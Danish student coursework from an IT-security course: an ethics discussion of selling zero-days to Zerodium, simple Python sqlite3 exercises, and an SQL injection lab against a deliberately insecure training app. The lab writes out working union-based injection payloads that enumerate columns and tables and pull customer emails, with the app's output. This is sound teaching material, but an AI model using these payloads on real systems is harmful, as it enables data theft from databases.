# Programmer der bruger relationelle databaser

!!! note "Læringsmål"

    **Viden**

    Den studerende har viden om og forståelse for:
    
    - ..

    **Færdigheder**

    Den studerende kan supportere løsning af sikkerhedsarbejde ved at:
    
    - Konstruere simple programmer der bruger SQL databaser

    **Kompetencer**

    Den studerende kan:
    
    - Håndtere mindre scripting programmer set ud fra et it-sikkerhedsmæssigt perspektiv

!!! note "Praktiske mål"

    - Øvelser gennemført

!!! note "Forberedelse"

    - Læs undervisningsplanen og øvelser
    - Læs kapitel 11 – Etik og IT sikkerhed, i "IT-Sikkerhed i praksis".

## Opgave - Etisk vurdering

!!! note "Opgave beskrivelse"

    1. Vælg et dilemma fra "introduktion til it-sikkerhed" side 435-441
    1. Diskutér det etiske problem, skriargumenter du ikke selv tænkte på ned.
    1. Beskriv de etiske hensyn, der er væsenlige for problemet.
    1. Afvej hensyn i forhold til hindanden for at nå frem til en vurdering.
    1. Skriv jeres begrundelse for vurderingen.

Vores valg:
> Sårbarheder købes
> 
> Zerodium er en amerikansk virksomhed, som handler med information om hidtil
> ukendte sårbarheder i it-systemer. Deres prislister for sårbarheder er tilgængeli-
> ge på deres hjemmeside. En Android zero day i god kvalitet kan tjene millioner af
> dollars for den security researcher, som først kan demonstrere sårbarheden over
> for Zerodium. Er det etisk forsvarligt at købe og sælge sårbarheder på en kon-
> trolleret platform? Kunne du finde på at sælge en sårbarhed til Zerodium uden at
> vide, hvad den skal bruges til?

Vi snakker om at det er en god ide i teorien, men i praksis, så er der så mange ukender variabler, man kan ikke vide hvilke aftaler virksomheden har, om de bliver støttet af andre lande som Rusland, Kina, eller Nord-korea. Efter den er solgt til firmaet har man ingen magt over hvad der sker med sårbarheden, da man nok skal underskrive en NDA. 

Vi fanndt frem til at Zerodium er villig til at give op til $1.5 millioner, for en Apple IOS zero-day, hvorimod Apple kun giver $200.000. Men igen man ved ikke hvor Zerodium fåre pengene fra, og hvem de måske kunne være founded af. Derud over har ejerne af Zerodium tideligere haft en ligende firma, som havde forbindelser til NSA.

Jeg mener slet ikke at det er etisk korrekt at sælge en sårbarhed til et privat firma på den måde.
Det rigtige ville være at kontakte virksomheden som har sårbarheden i deres produkt, så de selv kan fikse sårbarheden. Hvis der går lang tid hvor de ikke fikser det, kunne man så præsse dem, ved at sige at man leaker sårbarheden til offenligheden. Mange firmaer giver "bounties" for at vise dem det.

Vi endte med at blive enige om at det ikke er etisk korrekt. Da der er alt formange usikkerheder og man har ingen måde at vide hvad der sker bag lukkede døre i Zerodium. Man har ingen måde at gå tilbage hvis man sælger til dem. 

## Opgave - Programmering med database

!!! note "Opgave beskrivelse"

    1. Recap SQL syntax ved at prøve denne quiz [https://www.w3schools.com/sql/sql_quiz.asp](https://www.w3schools.com/sql/sql_quiz.asp)
    1. Læs om databaser og sql i dette kapitel [https://www.py4e.com/html3/15-database](https://www.py4e.com/html3/15-database)
    1. Læs om sqlite biblioteket [https://docs.python.org/3/library/sqlite3.html](https://docs.python.org/3/library/sqlite3.html)
    1. Brug dette eksempel som udgangspunkt for dit første database program. Analyser eksemplet inden du går til næste punkt.
    
        sqlite3_example.py

        ```python
        import sqlite3
        from pathlib import Path # read https://realpython.com/python-pathlib/#creating-paths
        files_path = Path(str(Path.cwd()) + '/databases/')
        print(files_path)

        # Create and connect to database
        conn = sqlite3.connect(files_path / 'music.db')

        cur = conn.cursor()

        # Create table in database
        with conn:
            cur.execute('DROP TABLE IF EXISTS Tracks')
            cur.execute('CREATE TABLE Tracks (title TEXT, plays INTEGER)')

        # Insert rows in tracks table
        with conn:
            cur.execute('INSERT INTO Tracks (title, plays) VALUES (?, ?)', ('Thunderstruck', 20))
            cur.execute('INSERT INTO Tracks (title, plays) VALUES (?, ?)', ('My Way', 15))

        # info to user
        print('All rows in the Tracks table:')

        # select values from table
        cur.execute('SELECT title, plays FROM Tracks')

        # print out the values
        for row in cur:
            print(row)
        cur.execute('DELETE FROM Tracks WHERE plays < 100')

        # Close database connection
        conn.close()
        ```
    1. Udvid programmet til at opdatere en af linjerne i tracks tabellen.
    1. Udvid programmet til at lave en ny tabel med et valgfrit antal felter.
    1. Indsæt 10 linjer i den nye tabel
    1. Hent linjerne og udskriv dem i alfabetisk orden.
    1. Slet en af linjerne

For at opdatere en af rækkerne har jeg lavet dette:

```python
with conn:
    cur.execute('UPDATE Tracks SET title = "Vil du noget?" WHERE title = "Thunderstruck"')
```

Dette opdatere sang titlen hvor sang titlen i forvejen er "Thunderstruck".

For at lave en ny tabel og tilføje 10 rækker til den skrev jeg dette kode:

```python
with conn:
    cur.execute('DROP TABLE IF EXISTS artists')
    cur.execute('CREATE TABLE artists (name TEXT)')

for i in range(10):
    with conn:
        cur.execute("INSERT INTO artists (name) VALUES (?)", (f"Band{i}",))
cur.execute("INSERT INTO artists (name) VALUES (?)", (f"Alphabeat",))
```

Her bliver det ikke printet i alfabestisk orden hvis man bruger `SELECT name FROM artists` og printer det.
Men hvis man bruger `SELECT * FROM artists ORDER BY name;` som herunder er det alfabetisk

```python
cur.execute('SELECT * FROM artists ORDER BY name; ')
for row in cur:
    print(row)
```

Til sidst har jeg slettet "Band5" sådan `cur.execute("DELETE FROM artists WHERE name='Band5';")`

??? note "Det resulterende kode"

    ```python
    import sqlite3
    from pathlib import Path # read https://realpython.com/python-pathlib/#creating-paths
    files_path = Path(str(Path.cwd()) + '/databases/')
    print(files_path)

    # Create and connect to database
    conn = sqlite3.connect(files_path / 'music.db')

    cur = conn.cursor()

    # Create table in database
    with conn:
        cur.execute('DROP TABLE IF EXISTS Tracks')
        cur.execute('CREATE TABLE Tracks (title TEXT, plays INTEGER)')

    # Insert rows in tracks table
    with conn:
        cur.execute('INSERT INTO Tracks (title, plays) VALUES (?, ?)', ('Thunderstruck', 20))
        cur.execute('INSERT INTO Tracks (title, plays) VALUES (?, ?)', ('My Way', 15))

    with conn:
        cur.execute('UPDATE Tracks SET title = "Vil du noget?" WHERE title = "Thunderstruck"')

    with conn:
        cur.execute('DROP TABLE IF EXISTS artists')
        cur.execute('CREATE TABLE artists (name TEXT)')

    for i in range(10):
        with conn:
            cur.execute("INSERT INTO artists (name) VALUES (?)", (f"Band{i}",))
    cur.execute("INSERT INTO artists (name) VALUES (?)", (f"Alphabeat",))

    cur.execute("DELETE FROM artists WHERE name='Band5';")
    # info to user
    print('All rows in the Tracks table:')

    # select values from table
    cur.execute('SELECT title, plays FROM Tracks')

    # print out the values
    for row in cur:
        print(row)
    cur.execute('DELETE FROM Tracks WHERE plays < 100')

    cur.execute('SELECT * FROM artists ORDER BY name; ')
    for row in cur:
        print(row)


    # Close database connection
    conn.close()
    ```


## Opgave - SQL injection i sqlite

???+ note "Opgave beskrivelse"

    1. Læs om insecure SQL injection i sqlite3
        Læg mærke til at det er usikkert at tillade rå SQL kommandoer fra bruger input, i stedet bør i bruge parametriserede værdier.
        Læg også mærke til hvad forskellen er på de to så i ved hvad i skal undgå i jeres fremtidige applikationer.
    1. Klon dette gitlab projekt: https://gitlab.com/npes-py-experiments/database-programs
    1. Start applikationen chinook_insecure.py (Spoiler, applikationen er usikker)
        ! ! I må ikke kigge på koden endnu ! !
    1. Prøv at hente data fra databasen ved at skrive et tal som input.

        Spørgsmål:
            - Hvilken data får i ud?
            - Hvad tror i tabellen der hentes data fra hedder? Hvordan kan i finde ud af det
            - Hvor mange rækker er der i tabellen? (prøv med høje tal)
            - Kan i få databasen til at fejle?

    Nu hvor i har dannet jer et overblik over hvordan applikationen fungerer og hvilken data i kan hente er det tid til at afprøve og (forhåbentlig) forstå hvordan i kan bruge SQL Union injection til at lække data fra databasen.

    1. Hvilken data returneres når i prøver at skrive '' som input? I får et tom resultat? Hvorfor mon det?? Det er fordi i nu bryder applikationens SQL kommando, læg mærke til at i ikke får en database fejl!
    1. Hvilken data returneres når i skriver '' OR TRUE; -- ?
        Interessant! Forespørgslen evaluerer altid til sandt og så får i pludselig en del data!! (hvis ikke gør i noget galt)

    1. Det er jo meget fint at alt data i tabellen lækkes på en gang, men det afslører ikke rigtig noget i ikke kunne tilgå alligevel.
        Det næste skridt er at finde ud af hvor mange kolonner der er i tabellen med:
        `1 ORDER BY 1` derefter `1 ORDER BY 1,2` derefter `1 ORDER BY 1,2,3` osv. indtil i får en fejl, når i får en fejl er det fordi i har for mange kolonner i din SQL statement.
        Grunden til at i skal kende antallet af kolonner ser i når i kommer til næste punkt....

        Spørgsmål: Hvor mange kolonner har tabellen?

    1. Nu hvor i kender antallet af kolonner kan i lække hvilke tabeller der er i databasen med:

        `1 UNION SELECT 1,group_concat(tbl_name),3 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'`

        **SQL UNION** kommandoen kombinerer flere select statements, så det er muligt at lave forespørgsler, der ikke er en del af applikationens intendere funktionalitet.
        Den SQL kommando der afvikles i applikationen ser således ud:

        `SELECT * FROM albums WHERE AlbumId = '' UNION SELECT 1,group_concat(tbl_name),3 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'`

        Læg mærke til hvordan kommandoen forbigår den oprindelige forespørgsel SELECT * FROM albums WHERE AlbumId = '' der jo returnerer et tomt resultat som i lærte i punkt 1 og tilføjer endnu en SELECT, som i kan kontrollere uafhængigt af applikationen !

    1. I kender nu databasens tabeller. En trusselsaktør vil nok gå efter brugernavne, email adresser, passwords og anden sensitiv information der kan bruges til at få adgang til andre dele af virksomhedens systemer, forsøg på phishing etc.. Databasen har nogle medarbejdere i tabellen employees, gad vide om der er noget spændende i den tabel? Denne kommando lækker hvordan tabellen er oprettet og afslører hvilke kolonner der er i databasen, deres datatyper osv:

        `1 union SELECT 1,sql,3 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'`

        I skal udskifte `table_name` i kommandoen med den tabel i vil bruge, f.eks employees (men i kan egentlig vælge den tabel i har lyst til.)

        Eksemplet her bruger employees tabellen og kolonnen Email.

        Spørgsmål: Hvilken kolonne har i lyst til at få data fra i jeres valgte tabel??

    1. Nu er det simpelt at lække data med kommandoen:

        `2 UNION SELECT 1,col_name,3 FROM table_name`

        husk at erstatte col_name og table_name med jeres valgte, tabel og kolonne navne.

        Spørgsmål:
            Hvor mange resultater får i?
            Kan i afgøre noget om hvilken måde virksomheden laver bruger navne f.eks initialer eller fornavn.efternavn? 

Jeg clone det repo som bliver givet, og starter programmet `chinook_insecure.py`. og starter med at insætte "Test", men jeg får en fejl.

```linenums="0"
Your injection attempt: Test
The query looks like this: SELECT * FROM albums WHERE AlbumId = Test
Database error: no such column: Test
```

Dette output siger mig at programmet forventer at tal ud fra `AlbumId`. Ved at give den et tal får man dette tilbage.

```linenums="0"
Your injection attempt: 1
The query looks like this: SELECT * FROM albums WHERE AlbumId = 1
Result from database:
[
  [
    1,
    "For Those About To Rock We Salute You",
    1
  ]
]
```

Så man får givet information om det album id man skriver. Tabellen hedder "albums" og der er 347 rækker i den.
Det fandt jeg ud af ved at bruge et `UNION` angreb, som gør det mulig at lave en kommando mere efter den første er eksikveret.
mit input kommer så til at se sådan ud `1 UNION SELECT * FROM albums`. Den godtager mit input som SQL kommandoer.

Jeg prøver at finde ud af hvor mange kolonner der er i denne tabel ved at bruge `1 ORDER BY 1` derefter `1 ORDER BY 1,2` derefter `1 ORDER BY 1,2,3`, når programmet fejler betyder det at den forrige var det maksimale antal af kolonner. I dette tilfælde er der 3 kolonner. 

```linenums="0"
Your injection attempt: 1 ORDER BY 1,2,3,4
The query looks like this: SELECT * FROM albums WHERE AlbumId = 1 ORDER BY 1,2,3,4
Database error: 4th ORDER BY term out of range - should be between 1 and 3
```

Her fejler den ved 4, hvilket vil sige at der er 3 kolonner.

Jeg bruger nu denne kommando ``, hvilket giver mig alle tebellerne i databasen.

```linenums="0"
Your injection attempt: 1 UNION SELECT 1,group_concat(tbl_name),3 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
The query looks like this: SELECT * FROM albums WHERE AlbumId = 1 UNION SELECT 1,group_concat(tbl_name),3 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
Result from database:
[
  [
    1,
    "For Those About To Rock We Salute You",
    1
  ],
  [
    1,
    "albums,artists,customers,employees,genres,invoices,invoice_items,media_types,playlists,playlist_track,tracks",
    3
  ]
]
```
Som det kan ses her er navnene på tabellerne `albums, artists, customers, employees, genres, invoices, invoice_items, media_types, playlists, playlist_track, tracks`

Jeg vil gerne se hvad der er i `customers` og `employees` tabellerne. Jeg prøver at bruge `1 union SELECT 1,sql,3 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='customers'`

Det jeg får tilbage er reglerne for tebellen hvordan rækkerne er bygget op og hvilke typer der er tilladt. Det ser sådan ud:

```linenums="0"
Your injection attempt: 1 union SELECT 1,sql,3 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='customers'
The query looks like this: SELECT * FROM albums WHERE AlbumId = 1 union SELECT 1,sql,3 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='customers'
Result from database:
[
  [
    1,
    "CREATE TABLE \"customers\"\r\n(\r\n    [CustomerId] INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,\r\n    [FirstName] NVARCHAR(40)  NOT NULL,\r\n    [LastName] NVARCHAR(20)  NOT NULL,\r\n    [Company] NVARCHAR(80),\r\n    [Address] NVARCHAR(70),\r\n    [City] NVARCHAR(40),\r\n    [State] NVARCHAR(40),\r\n    [Country] NVARCHAR(40),\r\n    [PostalCode] NVARCHAR(10),\r\n    [Phone] NVARCHAR(24),\r\n    [Fax] NVARCHAR(24),\r\n    [Email] NVARCHAR(60)  NOT NULL,\r\n    [SupportRepId] INTEGER,\r\n    FOREIGN KEY ([SupportRepId]) REFERENCES \"employees\" ([EmployeeId]) \r\n\t\tON DELETE NO ACTION ON UPDATE NO ACTION\r\n)",
    3
  ],
  [
    1,
    "For Those About To Rock We Salute You",
    1
  ]
]
```

Nu ved jeg hvad collonnerne hedder. Med `2 UNION SELECT 1,Email,3 FROM customers` kan jeg få email.